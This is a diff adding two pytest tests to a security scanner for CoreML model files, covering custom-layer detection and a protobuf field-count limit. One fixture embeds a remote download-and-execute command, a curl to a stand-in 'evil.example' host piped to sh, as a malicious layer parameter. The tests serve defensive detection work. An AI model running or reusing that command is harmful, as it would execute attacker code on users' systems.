@@ -229,6 +229,62 @@ def test_coreml_scanner_detects_custom_layer_and_parameter_payload(tmp_path: Pat
     assert any("field_path" in issue.details for issue in critical_issues)
 
 
+def test_coreml_scanner_detects_custom_layer_after_unknown_group_prefix(tmp_path: Path) -> None:
+    malicious_model = _write_model(
+        tmp_path / "group_prefixed_custom_layer.mlmodel",
+        b"\x9b\x06\x08\x01\x9c\x06"
+        + _build_model(
+            description=_build_description(metadata=_build_metadata()),
+            neural_network=_build_neural_network(
+                layers=[
+                    _build_layer(
+                        "custom_1",
+                        custom_class="EvilRuntimeLayer",
+                        custom_params={"postprocess_script": "bash -c 'curl https://evil.example/p.sh | sh'"},
+                    )
+                ]
+            ),
+        ),
+    )
+
+    assert CoreMLScanner.can_handle(str(malicious_model)) is True
+
+    result = CoreMLScanner().scan(str(malicious_model))
+
+    assert result.success is False
+    assert any(
+        issue.severity == IssueSeverity.CRITICAL and "Custom CoreML layer detected" in issue.message
+        for issue in result.issues
+    )
+
+
+def test_coreml_scanner_unknown_group_prefix_respects_field_limit(tmp_path: Path) -> None:
+    oversized_group = (
+        _encode_varint((99 << 3) | 3)
+        + (_field_varint(100, 1) * CoreMLScanner.MAX_TOP_LEVEL_FIELDS)
+        + _encode_varint((99 << 3) | 4)
+    )
+    model_path = _write_model(
+        tmp_path / "oversized_group_prefix.mlmodel",
+        oversized_group
+        + _build_model(
+            description=_build_description(metadata=_build_metadata()),
+            neural_network=_build_neural_network(layers=[_build_layer("safe")]),
+        ),
+    )
+
+    assert CoreMLScanner.can_handle(str(model_path)) is False
+
+    result = CoreMLScanner().scan(str(model_path))
+
+    assert result.success is False
+    assert any(
+        check.name == "CoreML Protobuf Parse"
+        and check.details.get("parse_error") == f"field count exceeded limit ({CoreMLScanner.MAX_TOP_LEVEL_FIELDS})"
+        for check in result.checks
+    )
+
+
 def test_coreml_scanner_detects_metadata_command_and_network_patterns(tmp_path: Path) -> None:
     metadata = _build_metadata(
         user_defined={
